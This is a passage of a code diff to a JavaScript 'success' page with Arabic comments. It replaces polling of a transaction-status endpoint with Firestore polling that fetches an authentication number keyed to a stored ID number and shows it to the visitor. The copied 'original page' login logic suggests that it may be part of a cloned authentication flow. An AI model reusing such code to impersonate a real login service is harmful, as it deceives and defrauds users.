-                    return true;
-                }
-            } catch (error) {
-                console.error('❌ خطأ في تحميل وعرض الرقم:', error);
-                return false;
-            }
-        }
-        
-        // ========== العملية الرئيسية ==========
-        async function startChecking() {
-            updateProgress(10, 'بدء عملية التحقق...');
+        // ========== الفحص الدوري ==========
+        function startPeriodicChecking() {
+            let checkCount = 0;
+            const MAX_CHECKS = 60; // 5 دقائق (كل 5 ثواني)
             
-            // 1. تهيئة Firebase أولاً
-            const firebaseInit = await initializeFirebaseForSuccess();
-            
-            // 2. إعداد مستمع Firebase للتحديثات الفورية
-            if (firebaseInit) {
-                firebaseListener = setupFirebaseRealtimeListener();
+            if (checkInterval) {
+                clearInterval(checkInterval);
             }
             
-            // 3. فحص أولي للرقم
-            updateProgress(50, 'جاري البحث عن بيانات المصادقة...');
-            const result = await checkForNumber();
-            
-            if (result.found) {
-                updateProgress(90, 'تم تحضير البيانات');
+            checkInterval = setInterval(async () => {
+                checkCount++;
                 
-                // عرض الرقم
-                loadAndDisplayNumber(result.numberData, result.source);
+                // تحديث رسالة الانتظار
+                const minutes = Math.floor((checkCount * 5) / 60);
+                const seconds = (checkCount * 5) % 60;
+                const waitingText = `جاري البحث... (${minutes}:${seconds.toString().padStart(2, '0')})`;
+                document.getElementById('loadingMessage').textContent = waitingText;
                 
-                // إخفاء شاشة التحميل بعد تأخير قصير
-                setTimeout(() => {
-                    document.getElementById('loadingScreen').style.display = 'none';
-                    document.getElementById('mainContent').style.display = 'block';
-                    updateProgress(100, 'تم التحميل بنجاح');
-                    
-                    // بدء الاستطلاع بعد عرض الرقم
-                    setTimeout(startPollingAfterDelay, 1000);
-                }, 1500);
-                
-                // إيقاف الفحص المتكرر
-                if (checkInterval) {
-                    clearInterval(checkInterval);
-                    checkInterval = null;
-                }
-                
-            } else if (result.timeout) {
-                // وقت الانتظار انتهى
-                document.getElementById('loadingTitle').textContent = 'انتهى وقت الانتظار';
-                document.getElementById('loadingMessage').innerHTML = 
-                    '<span style="color: #ff4757;">تجاوز وقت الانتظار. الرجاء فتح صفحة البيانات يدوياً.</span>';
-                
-                if (checkInterval) {
-                    clearInterval(checkInterval);
-                    checkInterval = null;
-                }
-            } else {
-                // بدء الفحص كل ثانية
-                if (!checkInterval) {
-                    checkInterval = setInterval(async () => {
-                        const checkResult = await checkForNumber();
-                        if (checkResult.found) {
-                            loadAndDisplayNumber(checkResult.numberData, checkResult.source);
-                            
-                            setTimeout(() => {
+                try {
+                    // البحث في Firestore
+                    if (firestoreDb) {
+                        const lastIdNumber = localStorage.getItem('lastIdNumber');
+                        if (lastIdNumber) {
+                            const searchResult = await searchByIdNumber(lastIdNumber);
+                            if (searchResult.found) {
+                                // تم العثور على رقم مصادقة
+                                clearInterval(checkInterval);
+                                
+                                currentAuthNumber = searchResult.data.authNumber;
+                                currentRecordId = searchResult.recordId;
+                                
+                                // إخفاء شاشة التحميل وإظهار المحتوى
                                 document.getElementById('loadingScreen').style.display = 'none';
                                 document.getElementById('mainContent').style.display = 'block';
                                 
-                                // بدء الاستطلاع بعد عرض الرقم
-                                setTimeout(startPollingAfterDelay, 1000);
-                            }, 1500);
-                            
-                            if (checkInterval) {
-                                clearInterval(checkInterval);
-                                checkInterval = null;
-                            }
-                            
-                            if (firebaseListener) {
-                                firebaseRealtimeDb.ref('current_auth_number').off('value', firebaseListener);
-                            }
-                        } else if (checkResult.timeout) {
-                            document.getElementById('loadingTitle').textContent = 'انتهى وقت الانتظار';
-                            document.getElementById('loadingMessage').innerHTML = 
-                                '<span style="color: #ff4757;">تجاوز وقت الانتظار.</span>';
-                            
-                            if (checkInterval) {
-                                clearInterval(checkInterval);
-                                checkInterval = null;
+                                // عرض الرقم
+                                displayAuthNumber(currentAuthNumber, 'فحص دوري من Firestore');
+                                
+                                // إعداد المراقبة
+                                realtimeListener = setupRealtimeMonitoring(currentRecordId);
+                                
+                                return;
                             }
                         }
-                    }, 1000);
+                    }
+                    
+                    // إذا تجاوز الحد الأقصى للفحص
+                    if (checkCount >= MAX_CHECKS) {
+                        clearInterval(checkInterval);
+                        
+                        document.getElementById('loadingTitle').textContent = 'انتهى وقت الانتظار';
+                        document.getElementById('loadingMessage').innerHTML = 
+                            '<span style="color: #ff4757;">لم يتم العثور على رقم مصادقة خلال الوقت المحدد.</span>';
+                        
+                        showError('انتهى وقت الانتظار. يرجى المحاولة مرة أخرى أو الاتصال بالدعم.');
+                    }
+                    
+                } catch (error) {
+                    console.error('❌ خطأ في الفحص الدوري:', error);
                 }
-            }
+            }, 5000); // كل 5 ثواني
         }
         
-        // ========== دوال الصفحة الأصلية ==========
-        function cancel() {
-            document.getElementById("cancelOnWeb").value = "cancelledOnWebWaiting";
-            document.getElementById("loginForm").submit();
-        }
-
-        function timeout() {
-            document.getElementById("cancelOnWeb").value = "webWaitingTimeout";
-            document.getElementById("loginForm").submit();
-        }
-
-        function startPollingAfterDelay() {
-            setTimeout(() => {
-                sendTimingInfoInit();
-            }, 2000);
-        }
-
-        function sendTimingInfoInit() {
-            var url_string = window.location.href;
-            var url = new URL(url_string);
-            var trx = url.searchParams.get("trx");
-
-            function poll() {
-                // إصلاح مشكلة 404: تحقق من أن trx ليس null
-                if (!trx) {
-                    console.warn('⚠️ trx غير محدد، تخطي طلب AJAX');
+        // ========== العملية الرئيسية ==========
+        async function startProcess() {
+            updateProgress(10, 'بدء عملية تحميل رقم المصادقة...');
+            
+            try {
+                // 1. تهيئة Firebase
+                const firebaseInit = await initializeFirebaseForSuccess();
+                if (!firebaseInit) {
                     return;
                 }
                 
-                var pollingurl = "/auth/trx/status?trx=" + trx;
-
-                if(document.getElementById("cancelOnWeb").value !== "cancelledOnWebWaiting" &&
-                   document.getElementById("cancelOnWeb").value !== "webWaitingTimeout") {
-                    $.ajax({
-                        type: "GET",
-                        cache: false,
-                        url: pollingurl,
-                        success: function (data, status) {
-                            if(data.code == '0') {
-                                if (data.isConfirmed == '0') {
-                                    setTimeout(poll, 2000);
-                                } else {
-                                    document.getElementById("loginForm").submit();
-                                }
-                            }
-                        },
-                        error: function(xhr, status, error) {
-                            console.warn('⚠️ خطأ في طلب AJAX:', error);
-                        }
-                    });
+                // 2. البحث عن رقم المصادقة
+                const result = await findAuthNumber();
+                
+                if (result.found) {
+                    updateProgress(90, 'جاري تحضير العرض...');
+                    
+                    // تأخير قصير ثم إظهار المحتوى
+                    setTimeout(() => {
+                        document.getElementById('loadingScreen').style.display = 'none';
+                        document.getElementById('mainContent').style.display = 'block';
+                        updateProgress(100, 'تم التحميل بنجاح');
+                        
+                        console.log('🎉 تم تحميل صفحة success بنجاح');
+                    }, 1500);
+                } else {
+                    // سيبدأ الفحص الدوري تلقائياً إذا لم يتم العثور
+                    console.log('⏳ لم يتم العثور على رقم مصادقة، بدء الفحص الدوري...');
                 }
+                
+            } catch (error) {
+                console.error('❌ خطأ في العملية الرئيسية:', error);
+                showError('حدث خطأ في النظام: ' + error.message);
             }
-            
-            setTimeout(poll, 3000);
-            setTimeout(timeout, 180000);
         }
-
+        
         // ========== عند تحميل الصفحة ==========
         document.addEventListener('DOMContentLoaded', function() {
             console.log('📄 صفحة success.html محملة');
@@ -931,34 +1132,51 @@
             document.getElementById('loadingScreen').style.display = 'flex';
             document.getElementById('mainContent').style.display = 'none';
             
-            // بدء عملية التحقق
-            startChecking();
+            // بدء العملية
+            startProcess();
             
             // تنظيف عند إغلاق الصفحة
             window.addEventListener('beforeunload', function() {
                 if (checkInterval) {
                     clearInterval(checkInterval);
                 }
-                if (firebaseListener && firebaseRealtimeDb) {
-                    firebaseRealtimeDb.ref('current_auth_number').off('value', firebaseListener);
+                if (realtimeListener) {
+                    realtimeListener(); // إلغاء الاشتراك في المراقبة
                 }
             });
         });
 
-        // ========== دالة للاختبار من وحدة التحكم ==========
-        window.testFirebaseSuccess = async function() {
-            console.log('🧪 اختبار Firebase في صفحة success...');
+        // ========== دوال للاختبار من وحدة التحكم ==========
+        window.testSuccessPage = async function() {
+            console.log('🧪 اختبار صفحة success...');
             
             const result = {
                 firebaseInitialized: firebaseInitialized,
-                firebaseRealtimeDb: !!firebaseRealtimeDb,
-                config: window.firebaseConfig ? 'موجود' : 'غير موجود',
-                services: window.firebaseServices ? 'موجود' : 'غير موجود',
+                firestoreDb: !!firestoreDb,
+                currentRecordId: currentRecordId,
+                currentAuthNumber: currentAuthNumber,
+                urlParams: Object.fromEntries(urlParams),
                 timestamp: new Date().toISOString()
             };
             
             console.log('📊 نتيجة الاختبار:', result);
             return result;
+        };
+        
+        window.forceShowAuthNumber = function(number) {
+            if (!number) {
+                number = prompt('أدخل رقم المصادقة للعرض:');
+                if (!number) return;
+            }
+            
+            currentAuthNumber = number;
+            displayAuthNumber(number, 'اختبار يدوي');
+            
+            // إظهار المحتوى
+            document.getElementById('loadingScreen').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'block';
+            
+            console.log('🔧 عرض رقم مصادقة يدوي:', number);
         };
 
     </script>
